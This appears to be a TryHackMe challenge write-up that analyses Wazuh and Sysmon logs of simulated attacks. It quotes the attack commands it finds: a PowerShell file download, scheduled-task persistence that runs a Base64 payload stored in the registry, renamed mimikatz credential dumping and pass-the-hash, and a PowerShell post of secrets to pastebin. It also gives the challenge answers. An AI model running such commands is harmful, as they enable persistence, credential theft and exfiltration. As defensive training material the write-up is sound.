# Monday Monitor

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
Tags: Linux
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
Ready to test Swiftspend's endpoint monitoring?
```

Room link: [https://tryhackme.com/room/mondaymonitor](https://tryhackme.com/room/mondaymonitor)

## Solution

### Scenario

Swiftspend Finance, the coolest fintech company in town, is on a mission to level up its cyber security game to keep those digital adversaries at bay and ensure their customers stay safe and sound.

Led by the tech-savvy Senior Security Engineer John Sterling, Swiftspend's latest project is about beefing up their endpoint monitoring using Wazuh and Sysmon. They've been running some tests to see how well their cyber guardians can sniff out trouble. And guess what? You're the cyber sleuth they've called in to crack the code!

The tests were run on Apr 29, 2024, between 12:00:00 and 20:00:00. As you dive into the logs, you'll look for any suspicious process shenanigans or weird network connections, you name it! Your mission? Unravel the mysteries within the logs and dish out some epic insights to fine-tune Swiftspend's defences.

### Machine Access

Click the **Start Machine** button attached to this task to start the VM. Give the machine about **5 minutes** to fully set up the environment.

Access the Wazuh Dashboard using your browser at `https://10-64-176-14.reverse-proxy.cell-prod-us-east-1a.vm.tryhackme.com` and use the credentials listed below:

- **Username**: `admin`
- **Password**: `Mond*yM0nit0r7`

Once logged in, navigate to the **Security events** module and use the saved query `Monday_Monitor` to access the logs.

### Initial access was established using a downloaded file. What is the file name saved on the host?

We start by selecting the saved search and change the time filter to `Last 7 years`.

![Monday Monitor Wazuh 1](Images/Monday_Monitor_Wazuh_1.png)

We are looking for a downloaded file and it's likely that it was downloaded by HTTP/HTTPS.  
We switch to the events tab and search for `http` in all fields.  
The result is 4 events:

![Monday Monitor Wazuh 2](Images/Monday_Monitor_Wazuh_2.png)

Checking the event with the description `Detects suspicious file execution by wscript and cscript` we see the following commandLine (`data.win.eventdata.commandLine`):

```text
\"powershell.exe\" &amp; {$url = 'http://localhost/PhishingAttachment.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\SwiftSpend_Financial_Expenses.xlsm}
```

A macro-enabled Excel file was dropped in the user's TEMP-directory.

Answer: `SwiftSpend_Financial_Expenses.xlsm`

### What is the full command run to create a scheduled task?

Next, we seach for `task` in all fields and get `757` events as a result.

That is a bit too much to through manually so we enable two additional columns

- `data.win.eventdata.image`
- `data.win.eventdata.commandLine`

to get a better overview:

![Monday Monitor Wazuh 3](Images/Monday_Monitor_Wazuh_3.png)

The columns `rule.level` and `rule.id` was removed.

The image `schtasks.exe` ougth to be the most interesting so let's filter on that:

![Monday Monitor Wazuh 4](Images/Monday_Monitor_Wazuh_4.png)

This turns out to be almost correct since THM is looking for the **parent** commandline!?

Expanding the earlist event and checking the `data.win.eventdata.parentCommandLine` field, we see:

```text
\"cmd.exe\" /c \"reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f &amp; schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 12:34\"
```

Answer: `\"cmd.exe\" /c \"reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f &amp; schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 12:34\"`

### What time is the scheduled task meant to run?

The start time is rather easy to spot in the commandline but if we need some help we can consult the [schtasks create documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create).

Answer: `12:34`

### What was encoded?

The `test` registry value contains Base64-encoded data that we can decode like this:

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Monday_Monitor]
└─$ echo 'cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0=' | base64 -d     
ping www.youarevulnerable.thm  
```

Answer: `ping www.youarevulnerable.thm`

### What password was set for the new user account?

Besides PowerShell, the most common way to configure users and groups is with `net.exe` so we filter on that in all fields.

The result is `30` events:

![Monday Monitor Wazuh 5](Images/Monday_Monitor_Wazuh_5.png)

In one of the events the attackers set the `guest` password first to `I_AM_M0NI0R1NG` and then to `I_AM_M0NIT0R1NG`.

Answer: `I_AM_M0NIT0R1NG`

### What is the name of the .exe that was used to dump credentials?

One of the most common credential dumping tools is `mimikatz` so let's start with searching for that.  
We get `23` events:

![Monday Monitor Wazuh 6](Images/Monday_Monitor_Wazuh_6.png)

Looking at the earliest events, we see a renamed version of the tool with these commandlines:

```text
C:\\Tools\\AtomicRedTeam\\atomics\\T1003.001\\bin\\x64\\memotech.exe  \"sekurlsa::minidump C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit

C:\\Tools\\AtomicRedTeam\\atomics\\T1003.001\\bin\\x64\\memotech.exe  \"sekurlsa::pth /user:john.sterling /domain:%%userdnsdomain%% /ntlm:6963989ca61ef2541bd614609964eabc\"
```

Answer: `memotech.exe`

### Data was exfiltrated from the host. What was the flag that was part of the data?

Assuming the flag starts with `THM`, we can search for that. The result is one event with this commandline:

```text
\"powershell.exe\" &amp; {$apiKey = \\\"\"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\\\"\" $content = \\\"\"secrets, api keys, passwords, THM{<REDACTED>}, confidential, private, wall, redeem...\\\"\" $url = \\\"\"https://pastebin.com/api/api_post.php\\\"\" $postData = @{   api_dev_key   = $apiKey   api_option    = \\\"\"paste\\\"\"   api_paste_code = $content } $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData Write-Host \\\"\"Your paste URL: $response\\\"\"}
```

Answer: `THM{<REDACTED>}`

For additional information, please see the references below.

## References

- [Atomic Red Team - GitHub](https://github.com/redcanaryco/atomic-red-team)
- [Atomic Red Team - Homepage](https://www.atomicredteam.io/)
- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [Mimikatz - GitHub](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz - Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Net user - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865(v=ws.11))
- [OS Credential Dumping (T1003) - MITRE ATT&CK](https://attack.mitre.org/techniques/T1003/)
- [PowerShell - Wikipedia](https://en.wikipedia.org/wiki/PowerShell)
- [Scheduled Task (T1053.005) - MITRE ATT&CK](https://attack.mitre.org/techniques/T1053/005/)
- [schtasks - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)
- [schtasks create - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [Valid Accounts (T1078) - MITRE ATT&CK](https://attack.mitre.org/techniques/T1078/)
- [Wazuh - Homepage](https://wazuh.com/)
- [Windows Registry - Wikipedia](https://en.wikipedia.org/wiki/Windows_Registry)
